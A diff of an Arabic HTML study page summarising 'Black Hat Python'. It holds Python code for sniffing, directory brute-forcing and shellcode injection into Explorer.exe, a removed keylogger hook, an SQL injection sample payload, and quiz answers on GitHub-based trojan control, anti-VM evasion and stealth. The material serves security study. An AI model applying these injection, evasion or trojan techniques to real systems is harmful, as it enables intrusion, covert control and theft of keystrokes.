@@ -541,28 +541,10 @@
 
       <!-- Left Main Content -->
       <main class="book-content" id="main-content-py">
+
         <!-- Section 1 -->
-        <section id="bhp-intro" class="content-sec">
-          <h2 class="sec-title">1. مقدمة وتهيئة بيئة تطوير بايثون الهجومية (Setting Up Your Python Environment)</h2>
-          <p>يركز هذا الفصل على تهيئة بيئة العمل الخاصة بالمطور الهجومي باستخدام لغة <strong>Python 3</strong>. يشرح الكاتب كيفية إعداد بيئات عمل معزولة (Virtual Environments) وتثبيت المكتبات الهجومية الأساسية.</p>
-          <div class="key-point">
-            <strong>💡 نصيحة الكاتب:</strong> بايثون هي الأداة المفضلة للمخترقين نظراً لسرعة كتابة الأكواد ووفرة المكتبات للتعامل مع الشبكات والذاكرة والبروتوكولات مباشرة.
-          </div>
-          <h3 class="sub-sec-title">خطوات تهيئة البيئة وتثبيت المكتبات:</h3>
-          <div class="code-box">
-            <button class="copy-btn" onclick="copyCode(this)">نسخ الأوامر</button>
-            <pre># Create virtual env
-python -m venv offensive_env
-source offensive_env/bin/activate
-
-# Install essential hacking libraries
-pip install scapy pycryptodome requests paramiko beautifulsoup4</pre>
-          </div>
-        </section>
-
-        <!-- Section 2 -->
-        <section id="bhp-network" class="content-sec">
-          <h2 class="sec-title">2. برمجة أدوات الشبكات (Network Tools)</h2>
+        <section id="py-network" class="content-sec">
+          <h2 class="sec-title">1. شبكات بايثون وبرمجة الـ Sockets</h2>
           <p>هنا يتم بناء أدوات للتعامل مع الـ Sockets والشبكات، بما في ذلك بناء TCP Client و Multi-threaded TCP Server للتحكم بالاتصالات الواردة.</p>
           <h3 class="sub-sec-title">أكواد بايثون كاملة للعميل والخادم:</h3>
           <p><strong>كود خادم TCP متعدد المسارات (Multi-threaded TCP Server):</strong></p>
@@ -588,11 +570,11 @@ while True:
     client_handler = threading.Thread(target=handle_client, args=(client,))
     client_handler.start()</pre>
           </div>
-        </section>
+</section>
 
-        <!-- Section 3 -->
-        <section id="bhp-sniffer" class="content-sec">
-          <h2 class="sec-title">3. بناء Sniffer وقراءة البيانات الخام (Raw Sockets)</h2>
+        <!-- Section 2 -->
+        <section id="py-sniffing" class="content-sec">
+          <h2 class="sec-title">2. اعتراض وتحليل حزم الشبكة (Sniffing)</h2>
           <p>كيفية كتابة سكريبت بايثون لقراءة وفك تشفير حزم الشبكة الخام (Raw Packets) على كارت الشبكة مباشرة دون الحاجة لأدوات خارجية مثل Wireshark.</p>
           <h3 class="sub-sec-title">كود الـ Sniffer للشبكات (بايثون 3):</h3>
           <div class="code-box">
@@ -626,11 +608,11 @@ print(sniffer.recvfrom(65565))
 if os.name == "nt":
     sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)</pre>
           </div>
-        </section>
+</section>
 
-        <!-- Section 4 -->
-        <section id="bhp-web" class="content-sec">
-          <h2 class="sec-title">4. اختراق وتجاوز تطبيقات الويب بـ Python</h2>
+        <!-- Section 3 -->
+        <section id="py-fuzzer" class="content-sec">
+          <h2 class="sec-title">3. بناء فاحص ومخمن ويب (Web Directory Fuzzer)</h2>
           <p>بناء سكربتات لتخمين المسارات الحساسة للمواقع (Content Brute-forcing) وسحب الملفات والبيانات الحساسة بشكل تلقائي فائق السرعة.</p>
           <h3 class="sub-sec-title">كود تخمين المسارات السريع (Directory Finder):</h3>
           <div class="code-box">
@@ -664,53 +646,20 @@ for i in range(threads):
     t = threading.Thread(target=dir_bruter, args=(resume_words,))
     t.start()</pre>
           </div>
-        </section>
+</section>
 
-        <!-- Section 5 -->
-        <section id="bhp-trojan" class="content-sec">
-          <h2 class="sec-title">5. بناء حصان طروادة متكامل بـ Python (Building a Trojan)</h2>
+        <!-- Section 4 -->
+        <section id="py-trojan" class="content-sec">
+          <h2 class="sec-title">4. تطوير حصان طروادة (Trojan Command & Control)</h2>
           <p>كود كامل لبناء هيكل تروجان (Trojan Framework) يقوم بسحب المهام والملفات من مستودع خارجي (مثل GitHub) وتنفيذها محلياً على جهاز الضحية.</p>
           <div class="benefit-box">
             <strong>🛡️ أثر التروجان:</strong> استخدام مكتبات بايثون لتخطي الـ Antivirus عن طريق قراءة الأكواد المشفرة عن بعد عبر HTTPS وتنفيذها داخل الذاكرة دون تخزينها على الهارد ديسك (Fileless Execution).
           </div>
-        </section>
+</section>
 
-        <!-- Section 6 -->
-        <section id="bhp-keylogger" class="content-sec">
-          <h2 class="sec-title">6. برمجة Keylogger متطور للويندوز (Windows Keylogger)</h2>
-          <p>برمجة سكريبت يقوم برصد ضغطات الأزرار على الكيبورد (Keystrokes) وتخزينها والتقاط لقطات شاشة (Screenshots) وإرسالها للسيرفر.</p>
-          <h3 class="sub-sec-title">كود بايثون متطور لرصد الكيبورد (Windows Hooking):</h3>
-          <div class="code-box">
-            <button class="copy-btn" onclick="copyCode(this)">نسخ كود Keylogger</button>
-            <pre>import ctypes
-import sys
-
-user32 = ctypes.windll.user32
-kernel32 = ctypes.windll.kernel32
-
-WH_KEYBOARD_LL = 13
-WM_KEYDOWN = 0x0100
-
-def set_hook(hook_proc):
-    return user32.SetWindowsHookExA(
-        WH_KEYBOARD_LL,
-        hook_proc,
-        kernel32.GetModuleHandleW(None),
-        0
-    )
-
-# A simple hook process wrapper
-def hook_callback(nCode, wParam, lParam):
-    if wParam == WM_KEYDOWN:
-        key = ctypes.string_at(lParam, 4)
-        print(f"[Key Detected]: {key}")
-    return user32.CallNextHookEx(None, nCode, wParam, lParam)</pre>
-          </div>
-        </section>
-
-        <!-- Section 7 -->
-        <section id="bhp-injection" class="content-sec">
-          <h2 class="sec-title">7. التلاعب بالذاكرة وحقن العمليات (Process Injection)</h2>
+        <!-- Section 5 -->
+        <section id="py-injection" class="content-sec">
+          <h2 class="sec-title">5. حقن العمليات بـ Ctypes والمسجلات</h2>
           <p>كيفية التلاعب بالعمليات النشطة على ويندوز (Windows Processes) وحقن Shellcode خبيث داخل مساحة ذاكرة عملية موثوقة (مثل Explorer.exe).</p>
           <h3 class="sub-sec-title">كود حقن العمليات (DLL/Process Injection):</h3>
           <div class="code-box">
@@ -739,8 +688,260 @@ kernel32.WriteProcessMemory(h_process, addr, shellcode, len(shellcode), ctypes.b
 thread_id = ctypes.c_ulong(0)
 kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 0, ctypes.byref(thread_id))</pre>
           </div>
+</section>
+
+        <!-- Section 6 -->
+                        <!-- Flashcards Section -->
+        <section id="black_hat_python-flashcards" class="content-sec">
+          <h2 class="sec-title">🎴 كروت المراجعة السيبرانية الذكية (Interactive 3D Flashcards)</h2>
+          <p>كروت مراجعة تفاعلية لحفظ الأوامر والبصمات. انقر على أي كرت لقلبه ومعرفة الإجابة النموذجية:</p>
+          
+          <div class="flashcards-grid">
+            <div class="flashcard-wrapper" onclick="toggleFlashcard(this)">
+              <div class="flashcard-inner">
+                <div class="flashcard-front">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">❓</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4;">لماذا يفضل المهاجمون استخدام Python؟</div>
+                </div>
+                <div class="flashcard-back">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">💡</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4; font-family: monospace;">سرعة كتابة الكود وتوافر مكتبات قوية للتلاعب بحزم الشبكة مثل Scapy</div>
+                </div>
+              </div>
+            </div>
+            <div class="flashcard-wrapper" onclick="toggleFlashcard(this)">
+              <div class="flashcard-inner">
+                <div class="flashcard-front">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">❓</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4;">كيف ننشئ اتصال TCP Client خفيف في بايثون؟</div>
+                </div>
+                <div class="flashcard-back">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">💡</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4; font-family: monospace;">استخدام مكتبة socket.socket والاتصال المباشر دون أي ملحقات خارجية</div>
+                </div>
+              </div>
+            </div>
+            <div class="flashcard-wrapper" onclick="toggleFlashcard(this)">
+              <div class="flashcard-inner">
+                <div class="flashcard-front">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">❓</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4;">ما هو الـ Banner Grabbing وكيف يتم برمجته؟</div>
+                </div>
+                <div class="flashcard-back">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">💡</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4; font-family: monospace;">استقبال البيانات الترحيبية من المنفذ لمعرفة إصدار الخدمة الجارية</div>
+                </div>
+              </div>
+            </div>
+            <div class="flashcard-wrapper" onclick="toggleFlashcard(this)">
+              <div class="flashcard-inner">
+                <div class="flashcard-front">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">❓</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4;">ما هي دالة subprocess.Popen ولماذا تستخدم بالـ Backdoor؟</div>
+                </div>
+                <div class="flashcard-back">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">💡</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4; font-family: monospace;">لتشغيل أوامر النظام مباشرة داخل السيرفر واسترجاع المخرجات للمتسلل</div>
+                </div>
+              </div>
+            </div>
+            <div class="flashcard-wrapper" onclick="toggleFlashcard(this)">
+              <div class="flashcard-inner">
+                <div class="flashcard-front">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">❓</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4;">كيف نلتقط حزم الشبكة برمجياً بدون Wireshark؟</div>
+                </div>
+                <div class="flashcard-back">
+                  <div style="font-size: 1.5rem; margin-bottom: 8px;">💡</div>
+                  <div style="font-size: 0.85rem; font-weight: bold; line-height: 1.4; font-family: monospace;">عن طريق فتح Raw Socket وتفسير الحزم بلغة بايثون</div>
+                </div>
+              </div>
+            </div>
+          </div>
         </section>
-</main>
+
+        <!-- Payload Sandbox Section -->
+        <section id="black_hat_python-sandbox" class="content-sec">
+          <h2 class="sec-title">🧪 مختبر حقن البايلودز الحي (Interactive Payload Sandbox)</h2>
+          <p>مختبر محاكاة تفاعلي لاختبار وتحليل البايلودز ورؤية الاستجابة المباشرة للخوادم:</p>
+          
+          <div style="background: rgba(3,3,8,0.9); border: 1px solid var(--border-glass); border-radius: 8px; padding: 20px; margin: 20px 0;">
+            <div style="margin-bottom: 15px;">
+              <label style="color:#fff; font-size:0.85rem; font-weight:700; display:block; margin-bottom:5px;">اختر نوع الثغرة للاختبار:</label>
+              <select id="sandbox-type-black_hat_python" onchange="updateSandboxPayloads('black_hat_python')" style="background:#0d0d1a; border:1px solid rgba(255,255,255,0.15); color:#fff; padding:8px; border-radius:4px; width:100%; outline:none; font-size:0.85rem;">
+                <option value="sqli">SQL Injection (SQLi)</option>
+                <option value="xss">Cross-Site Scripting (XSS)</option>
+                <option value="ssrf">Server-Side Request Forgery (SSRF)</option>
+              </select>
+            </div>
+            
+            <div style="margin-bottom: 15px;">
+              <label style="color:#fff; font-size:0.85rem; font-weight:700; display:block; margin-bottom:5px;">البايلود (Payload Input):</label>
+              <input type="text" id="sandbox-payload-black_hat_python" value="' OR '1'='1" style="background:#0d0d1a; border:1px solid rgba(255,255,255,0.15); color:var(--accent-cyan); padding:10px; border-radius:4px; width:100%; outline:none; font-family:monospace; font-size:0.85rem; box-sizing:border-box;">
+            </div>
+
+            <button onclick="runSandboxExploit('black_hat_python')" style="background:var(--gradient-primary); border:none; color:#fff; padding:10px 20px; border-radius:4px; font-weight:700; cursor:pointer; width:100%; font-size:0.88rem;">
+              ⚡ تنفيذ الهجوم ومحاكاة الاستجابة
+            </button>
+
+            <!-- Terminal Output -->
+            <div style="margin-top: 20px; background:#000; border: 1px solid rgba(255,255,255,0.08); border-radius: 6px; overflow: hidden;">
+              <div style="background:#0d0d1a; padding:6px 12px; font-size:0.72rem; color:var(--text-secondary); border-bottom:1px solid rgba(255,255,255,0.08); font-family:monospace; display:flex; justify-content:space-between;">
+                <span>CONSOLE OUTPUT</span>
+                <span>STATUS: ACTIVE</span>
+              </div>
+              <div id="sandbox-terminal-black_hat_python" style="padding:15px; font-family:monospace; font-size:0.8rem; color:#00ff66; min-height:120px; max-height:200px; overflow-y:auto; line-height:1.5; text-align:left; direction:ltr;">
+                [+] System ready. Input payload and click Execute to begin simulation...
+              </div>
+            </div>
+
+            <!-- Virtual Browser Frame if XSS -->
+            <div id="sandbox-browser-wrap-black_hat_python" style="margin-top: 20px; border: 1px solid rgba(255,255,255,0.08); border-radius: 6px; overflow: hidden; display:none;">
+              <div style="background:#0d0d1a; padding:6px 12px; font-size:0.72rem; color:var(--text-secondary); border-bottom:1px solid rgba(255,255,255,0.08); font-family:monospace;">
+                🖥️ VIRTUAL BROWSER FRAME
+              </div>
+              <div id="sandbox-browser-content-black_hat_python" style="background:#fff; color:#000; padding:20px; text-align:center; min-height:80px; font-size:0.9rem;">
+                Virtual Viewport
+              </div>
+            </div>
+
+          </div>
+        </section>
+
+<!-- Author Strategic Tips -->
+        <section id="py-tips" class="content-sec">
+          <h2 class="sec-title">💡 نصائح وتوجيهات الكاتب الميدانية (Offensive Python Golden Advice)</h2>
+          <p>جمعنا لك هنا زبدة الخبرة العملية والنصائح الذهبية التي يركز عليها الكاتب في فصول كتابه للتنقيب والعمل الميداني الفعلي:</p>
+          
+          <div class="benefit-box">
+            <ul style="margin: 0; padding-right: 20px;">
+              <li style='margin-bottom: 12px;'><strong>اكتب أكواداً خالية من الملحقات الخارجية (Pure Python):</strong> الاعتماد على المكتبات الافتراضية (socket, sys) يضمن عمل السكربت على أي سيرفر مخترق.</li>
+              <li style='margin-bottom: 12px;'><strong>صمم سكربتاتك لتكون مرنة ومستقرة:</strong> سكريبت الاختراق الضعيف قد يسبب انهيار خوادم الهدف (Crash) مما يفقدك فرصة السيطرة والاتصال.</li>
+              <li style='margin-bottom: 12px;'><strong>ابنِ فاحص المسارات الخاص بك:</strong> الفواحص الجاهزة ترسل طلبات بنمط معروف يسهل كشفه وحظره، التخصيص يمنحك تخفياً كاملاً.</li>
+            </ul>
+          </div>
+        </section>
+
+        <section id="py-quiz" class="content-sec">
+          <h2 class="sec-title">6. بنك الأسئلة والاختبارات التفاعلية الـ 10</h2>
+          
+          <div class="quiz-container">
+            <div class="quiz-title">🧪 بنك أسئلة مراجعة كتاب Black Hat Python (انقر لعرض الإجابة النموذجية)</div>
+            
+            <!-- Q1 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerPy('qp-1')">
+                <span>1. ما هو الفرق بين socket.SOCK_STREAM و socket.SOCK_DGRAM في بايثون؟</span>
+                <span class="toggle-icon" id="icon-qp-1">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qp-1">
+                <strong>الإجابة النموذجية:</strong> الـ `socket.SOCK_STREAM` يعبر عن بروتوكول TCP الموثوق والمهيأ لإنشاء اتصال مصافحة كامل. بينما `socket.SOCK_DGRAM` يعبر عن بروتوكول UDP غير الموثوق والسريع لإرسال حزم البيانات المستقلة دون الحاجة لإنشاء اتصال أولي مسبق.
+              </div>
+            </div>
+
+            <!-- Q2 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerPy('qp-2')">
+                <span>2. لماذا نستخدم مكتبة struct في بايثون عند قراءة حزم الشبكة الخام (Raw Packets)؟</span>
+                <span class="toggle-icon" id="icon-qp-2">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qp-2">
+                <strong>الإجابة النموذجية:</strong> لأن حزم الشبكة تأتي كبيانات ثنائية خام (Raw bytes). مكتبة `struct` تتيح لنا تفكيك هذه البايتات وتحويلها لمتغيرات بايثون مفهومة (مثل أرقام وحروف) بناءً على صيغ معيارية ومحددة لبصمات الترويسات بالشبكة.
+              </div>
+            </div>
+
+            <!-- Q3 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerPy('qp-3')">
+                <span>3. كيف يساعد تطبيق خيوط المعالجة المتعددة (Multi-threading) في تسريع أدوات الاختراق؟</span>
+                <span class="toggle-icon" id="icon-qp-3">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qp-3">
+                <strong>الإجابة النموذجية:</strong> يسمح بإنشاء وتشغيل مهام متعددة بالوقت نفسه (مثل إرسال 100 طلب للموقع بالثانية عبر خيوط معالجة منفصلة) بدلاً من الانتظار لانتهاء كل طلب بالتتابع، مما يقلل الوقت المستغرق للفحص الأمني بشكل كبير.
+              </div>
+            </div>
+
+            <!-- Q4 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerPy('qp-4')">
+                <span>4. كيف يمكن استخدام مكتبة ctypes في بايثون للاتصال بـ Windows API؟</span>
+                <span class="toggle-icon" id="icon-qp-4">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qp-4">
+                <strong>الإجابة النموذجية:</strong> مكتبة `ctypes` توفر إمكانية استدعاء دوال ومكتبات لغة C المكتوبة وجاهزة بالنظام (مثل DLLs الرسمية كـ kernel32.dll) والتعامل المباشر مع الذاكرة واستدعاء الوظائف الحساسة للويندوز مباشرة من كود بايثون.
+              </div>
+            </div>
+
+            <!-- Q5 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerPy('qp-5')">
+                <span>5. كيف يعمل حصان طروادة المعتمد على Github C&C الموضح في الكتاب؟</span>
+                <span class="toggle-icon" id="icon-qp-5">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qp-5">
+                <strong>الإجابة النموذجية:</strong> يقوم السكريبت المثبت بجهاز الضحية بالاتصال تلقائياً بمستودع GitHub خاص بالمهاجم باستخدام الـ API، ويسحب ملفات التكوين والأكواد المطلوب تشغيلها، ثم ينفذها ديناميكياً باستخدام دالة `exec` ويرفع النتائج للمستودع مرة أخرى، مما يصعب كشف الاتصال لأن حركة المرور تبدو كزيارة عادية لموقع GitHub الموثوق.
+              </div>
+            </div>
+
+            <!-- Q6 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerPy('qp-6')">
+                <span>6. ما هي دالة exec() في بايثون ولماذا يعتبر استخدامها خطيراً في الأكواد غير الموثوقة؟</span>
+                <span class="toggle-icon" id="icon-qp-6">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qp-6">
+                <strong>الإجابة النموذجية:</strong> دالة `exec()` تقوم بتشغيل وتفسير نصوص بايثون الممرة إليها ديناميكياً كأكواد برمجية صالحة. خطورتها تكمن في أنه إذا نجح مهاجم في حقن أي نص بداخل الدالة، فسيتم تشغيله بالكامل بصلاحيات السكريبت الحالي وقد يؤدي لتدمير النظام.
+              </div>
+            </div>
+
+            <!-- Q7 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerPy('qp-7')">
+                <span>7. كيف تكتشف البرمجيات الخبيثة المكتوبة بالبايثون بيئات التحليل الافتراضية (Anti-VM)؟</span>
+                <span class="toggle-icon" id="icon-qp-7">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qp-7">
+                <strong>الإجابة النموذجية:</strong> تتحقق من مواصفات العتاد باستدعاء واجهات النظام (مثل حجم الرام الضعيف أو قلة عدد المعالجات)، أو مراقبة حركة الماوس ونقرات الكيبورد للتأكد من وجود تفاعل بشري حقيقي، وفي حال رصد خمول كامل تتوقف عن العمل فوراً لتجنب كشف سلوكها.
+              </div>
+            </div>
+
+            <!-- Q8 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerPy('qp-8')">
+                <span>8. ما هي فائدة استدعاء الدالة VirtualAllocEx في عملية حقن الأكواد؟</span>
+                <span class="toggle-icon" id="icon-qp-8">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qp-8">
+                <strong>الإجابة النموذجية:</strong> تقوم بحجز مساحة ذاكرة جديدة وصالحة للقراءة والكتابة والتشغيل (PAGE_EXECUTE_READWRITE) بداخل عملية مستهدفة أخرى بعيدة، لتسمح لنا لاحقاً بكتابة وحقن الـ Shellcode بداخل هذه المساحة المحجوزة.
+              </div>
+            </div>
+
+            <!-- Q9 -->
+            <div class="quiz-item" style="margin-bottom:15px; border-bottom:1px dashed rgba(255,255,255,0.05); padding-bottom:15px;">
+              <button class="quiz-question-btn" onclick="toggleAnswerPy('qp-9')">
+                <span>9. كيف يعمل كاشف نقرات لوحة المفاتيح (Keylogger) في بيئات ويندوز؟</span>
+                <span class="toggle-icon" id="icon-qp-9">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qp-9">
+                <strong>الإجابة النموذجية:</strong> يستعين بـ Hooking للوحة المفاتيح باستخدام دالة الـ Windows API وهي `SetWindowsHookEx` ليعترض كافة نقرات المفاتيح قبل إرسالها للتطبيق المستهدف، ويقوم بحفظها وتسجيلها بملف سري تمهيداً لتسريبها للمهاجم.
+              </div>
+            </div>
+
+            <!-- Q10 -->
+            <div class="quiz-item">
+              <button class="quiz-question-btn" onclick="toggleAnswerPy('qp-10')">
+                <span>10. كيف يمكن استخدام مكتبة Scapy في بايثون لصياغة حزم بيانات مخصصة؟</span>
+                <span class="toggle-icon" id="icon-qp-10">[ + ]</span>
+              </button>
+              <div class="quiz-answer-panel" id="ans-qp-10">
+                <strong>الإجابة النموذجية:</strong> تتيح `Scapy` صياغة الحزم يدوياً طبقة تلو طبقة (مثل `IP()/TCP()/"payload"`). هذا يمنح المهاجم قدرة كاملة على التلاعب بحقول الترويسات (مثل تغيير عنوان المرسل Spoofing أو تعديل الأعلام TCP flags) للقيام بعمليات فحص واختبار دقيقة جداً.
+              </div>
+            </div>
+
+          </div>
+        </section>
+
+      </main>
 
     </div>
 
